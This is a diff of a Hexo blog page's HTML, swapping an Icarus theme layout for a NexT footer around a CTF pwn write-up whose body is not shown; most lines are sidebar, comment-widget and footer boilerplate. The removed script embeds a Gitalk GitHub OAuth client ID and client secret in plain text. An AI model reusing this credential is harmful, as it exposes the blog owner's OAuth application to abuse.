-</div><div class="article-licensing box"><div class="licensing-title"><p>CTFSHOW卷王杯-pwn</p><p><a href="https://y1seco.github.io/2022/02/27/CTFSHOW卷王杯- Incomplete Menu/">https://y1seco.github.io/2022/02/27/CTFSHOW卷王杯- Incomplete Menu/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><a href="https://y1seco.github.io"><p>y1seco</p></a></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-02-27</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2022-02-27</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="recommend-area"><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># Related Post</span><br><span>  1.<a class="is-size-6" href="/2022/02/27/gyctf_2020_force/" target="_blank">gyctf_2020_force</a><br></span><span>  2.<a class="is-size-6" href="/2022/02/18/BUUCTF%20Pwn%20Exercise/" target="_blank">BUUCTF Pwn Exercise(一)</a><br></span><span>  3.<a class="is-size-6" href="/2022/02/01/xdctf2015_pwn200/" target="_blank">xdctf2015_pwn200</a><br></span><span>  4.<a class="is-size-6" href="/2022/01/27/%E5%A0%86%E9%A2%98%E6%80%BB%E7%BB%93/" target="_blank">堆题总结</a><br></span><span>  5.<a class="is-size-6" href="/2022/01/24/cmcc_simplerop/" target="_blank">cmcc_simplerop</a><br></span><span>  6.<a class="is-size-6" href="/2022/01/19/hitcontraining_unlink/" target="_blank">hitcontraining_unlink</a><br></span><span>  7.<a class="is-size-6" href="/2022/01/14/0ctf_2017_babyheap/" target="_blank">0ctf2017-babyheap</a><br></span><span>  8.<a class="is-size-6" href="/2022/01/13/jarvisoj_level6_x64/" target="_blank">jarvisoj_level6_x64</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>Alipay</span><span class="qrcode"><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202112251641315.png" alt="Alipay"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202112251641009.png" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/02/27/gyctf_2020_force/"><span class="level-item">gyctf_2020_force</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--><div class="card"><div class="card-content"><div class="title is-5">Comments</div><div id="comment-container"></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/gitalk/1.6.0/gitalk.css"><script> $.getScript('/js/gitalk.min.js', function () { 
-            var gitalk = new Gitalk({
-            language:'zh-CN',
-            id: 'b6846a5fad9dd2690cb52184d101b5b6',
-            repo: 'blog_comments',
-            owner: 'y1seco',
-            clientID: 'fd76c4da4d218138902f',
-            clientSecret: '4e352bc8c73327810c18892ef0a825d8ec6cb020',
-            admin: ["y1seco"],
-            createIssueManually: true,
-            distractionFreeMode: false,
-            perPage: 10,
-            pagerDirection: 'last',
-            proxy: 'https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token',
-            
-            enableHotKey: true,
-            isLocked: false
-        })
-        gitalk.render('comment-container')});</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="is-flex is-mobile" href="#check-in"><span class="mr-2">1</span><span>check in</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#思路"><span class="mr-2">1.1</span><span>思路</span></a></li><li><a class="is-flex is-mobile" href="#EXP"><span class="mr-2">1.2</span><span>EXP</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#Incomplete-Menu"><span class="mr-2">2</span><span>Incomplete Menu</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#思路-1"><span class="mr-2">2.1</span><span>思路</span></a></li><li><a class="is-flex is-mobile" href="#EXP-1"><span class="mr-2">2.2</span><span>EXP</span></a></li><li><a class="is-flex is-mobile" href="#参考"><span class="mr-2">2.3</span><span>参考</span></a></li></ul></li></ul></div></div><style>.menu-list > li > a.is-active + .menu-list { display: block; }.menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/./img/avatar1.jpeg" alt="y1seco"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">y1seco</p><p class="is-size-6 is-block">沉默是庞大的颂歌</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">22</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">7</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">6</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/y1seco" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/y1seco"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:K4oer_Xr@bupt.edu.cn"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
-                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
-                                if(data){
-                                    $('#hitokoto').html("");
-                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
-                                    "<p>"+"From《"+data.from+"》</p><p>Provider-"+data.creator+"</p>");
-                                }});}
-                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://P4nda.top" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">P4nda</span></span><span class="level-right"><span class="level-item tag">p4nda.top</span></span></a></li><li><a class="level is-mobile" href="https://ama2in9.top/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Ama2in9</span></span><span class="level-right"><span class="level-item tag">ama2in9.top</span></span></a></li><li><a class="level is-mobile" href="https://eternalsakura13.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Sakura</span></span><span class="level-right"><span class="level-item tag">eternalsakura13.com</span></span></a></li><li><a class="level is-mobile" href="https://p1umer.github.io/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">P1umer</span></span><span class="level-right"><span class="level-item tag">p1umer.github.io</span></span></a></li><li><a class="level is-mobile" href="https://e0hyl.github.io/BLOG-OF-E0/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">E0</span></span><span class="level-right"><span class="level-item tag">e0hyl.github.io</span></span></a></li><li><a class="level is-mobile" href="https://linkleyping.top/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">EP</span></span><span class="level-right"><span class="level-item tag">linkleyping.top</span></span></a></li></ul></div></div></div><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><figure class="media-left"><a class="image" href="/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/"><img src="https://w.wallhaven.cc/full/o3/wallhaven-o3vyk5.jpg" alt="CTFSHOW卷王杯-pwn"></a></figure><div class="media-content"><p class="date"><time dateTime="2022-02-27T14:53:54.034Z">2022-02-27</time></p><p class="title"><a href="/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/">CTFSHOW卷王杯-pwn</a></p><p class="categories"><a href="/categories/pwn/">pwn</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/2022/02/27/gyctf_2020_force/"><img src="https://w.wallhaven.cc/full/72/wallhaven-72m8ve.jpg" alt="gyctf_2020_force"></a></figure><div class="media-content"><p class="date"><time dateTime="2022-02-27T13:56:08.013Z">2022-02-27</time></p><p class="title"><a href="/2022/02/27/gyctf_2020_force/">gyctf_2020_force</a></p><p class="categories"><a href="/categories/pwn/">pwn</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/2022/02/18/BUUCTF%20Pwn%20Exercise/"><img src="https://w.wallhaven.cc/full/o3/wallhaven-o3wzql.jpg" alt="BUUCTF Pwn Exercise(一)"></a></figure><div class="media-content"><p class="date"><time dateTime="2022-02-17T16:06:05.055Z">2022-02-18</time></p><p class="title"><a href="/2022/02/18/BUUCTF%20Pwn%20Exercise/">BUUCTF Pwn Exercise(一)</a></p><p class="categories"><a href="/categories/pwn/">pwn</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/2022/02/17/%E3%80%90%E7%8E%8B%E9%81%93%E8%80%83%E7%A0%94%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E3%80%91%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E4%BB%A3%E7%A0%81%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93%20C%E8%AF%AD%E8%A8%80(%E6%A0%91%E5%92%8C%E5%9B%BE%EF%BC%89/"><img src="https://w.wallhaven.cc/full/57/wallhaven-57jge1.jpg" alt="数据结构基础代码总结（树和图）"></a></figure><div class="media-content"><p class="date"><time dateTime="2022-02-17T03:32:41.836Z">2022-02-17</time></p><p class="title"><a href="/2022/02/17/%E3%80%90%E7%8E%8B%E9%81%93%E8%80%83%E7%A0%94%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E3%80%91%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E4%BB%A3%E7%A0%81%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93%20C%E8%AF%AD%E8%A8%80(%E6%A0%91%E5%92%8C%E5%9B%BE%EF%BC%89/">数据结构基础代码总结（树和图）</a></p><p class="categories"><a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/2022/02/13/flask%E9%85%8D%E7%BD%AE%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1/"><img src="https://w.wallhaven.cc/full/9m/wallhaven-9mel2k.png" alt="flask配置celery异步任务"></a></figure><div class="media-content"><p class="date"><time dateTime="2022-02-13T08:40:17.770Z">2022-02-13</time></p><p class="title"><a href="/2022/02/13/flask%E9%85%8D%E7%BD%AE%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1/">flask配置celery异步任务</a></p><p class="categories"><a href="/categories/flask/">flask</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/Kernel/"><span class="level-start"><span class="level-item">Kernel</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/flask/"><span class="level-start"><span class="level-item">flask</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/leetcode/"><span class="level-start"><span class="level-item">leetcode</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/pwnable-tw/"><span class="level-start"><span class="level-item">pwnable.tw</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"><span class="level-start"><span class="level-item">数据结构</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E9%9A%8F%E7%AC%94/"><span class="level-start"><span class="level-item">随笔</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/12/"><span class="level-start"><span class="level-item">December 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/11/"><span class="level-start"><span class="level-item">November 2021</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/leetcode/"><span class="tag">leetcode</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9A%8F%E7%AC%94/"><span class="tag">随笔</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Kernel/"><span class="tag">Kernel</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flask/"><span class="tag">flask</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"><span class="tag">数据结构</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen"></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/./img/avatar1.jpeg" alt="Y1secoのblog" height="28"></a><p class="size-small"><span>&copy; 2022 y1seco</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span><span id="statistic-times">loading...</span><script>function createTime(time) {
-            var n = new Date(time);
-            now.setTime(now.getTime() + 250),
-                days = (now - n) / 1e3 / 60 / 60 / 24,
-                dnum = Math.floor(days),
-                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
-                hnum = Math.floor(hours),
-            1 == String(hnum).length && (hnum = "0" + hnum),
-                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
-                mnum = Math.floor(minutes),
-            1 == String(mnum).length && (mnum = "0" + mnum),
-                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
-                snum = Math.round(seconds),
-            1 == String(snum).length && (snum = "0" + snum),
-                document.getElementById("statistic-times").innerHTML = "❤️Site from <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> has existed <strong>" + dnum + "</strong> d <strong>" + hnum + "</strong> h <strong>" + mnum + "</strong> m <strong>" + snum + "</strong> s！❤️";
-        }var now = new Date();setInterval("createTime('2021/12/8 00:00:00')", 250,"");</script><br></span><div class="size-small"><span>❤️Thx <strong><span id="busuanzi_value_site_uv">99+</span></strong> users <strong><span id="busuanzi_value_site_pv">99+</span></strong> visited！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2364053447" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
-            article: {
-                highlight: {
-                    clipboard: true,
-                    fold: 'unfolded'
-                }
-            }
-        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
-            if (typeof $.fn.lightGallery === 'function') {
-                $('.article').lightGallery({ selector: '.gallery-item' });
-            }
-            if (typeof $.fn.justifiedGallery === 'function') {
-                if ($('.justified-gallery > p > .gallery-item').length) {
-                    $('.justified-gallery > p > .gallery-item').unwrap();
-                }
-                $('.justified-gallery').justifiedGallery();
-            }
-        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('fd76c4da4d218138902f','4e352bc8c73327810c18892ef0a825d8ec6cb020','y1seco','blog_comments',false);})</script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
-            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
-        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
-            elements: "a",//代表点击链接就更新
-            selectors: [  //代表要更新的节点
-                ".section",
-                "title"
-            ],
-            cache: true,
-            cacheBust:false
-        })
 
-        function loadBusuanzi(){
-        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
-        }
+    </div>
 
-        function loadMathJax() { //加载mathjax
-            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
-                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
-                var math = document.getElementsByClassName("entry-content")[0];
-                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
-            });
-        };
+    
+    
+    
 
-        // 开始 PJAX 执行的函数
-        document.addEventListener('pjax:send', function () {
-        });
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
         
-        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
-        document.addEventListener('pjax:complete', function () {
-            $(".section").css({opacity:1});
-            if(false){
-                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('fd76c4da4d218138902f','4e352bc8c73327810c18892ef0a825d8ec6cb020','y1seco','blog_comments',false);});
-            }
-            if(false){
-                loadMathJax();
-            }
-            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
-            loadBackTop();
-            loadBusuanzi();
-            if(typeof loadBanner == 'function'){
-                loadBanner();
-            }
-        });</script></body></html>
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/02/27/gyctf_2020_force/" rel="prev" title="gyctf_2020_force">
+                  <i class="fa fa-chevron-left"></i> gyctf_2020_force
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">y1seco</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
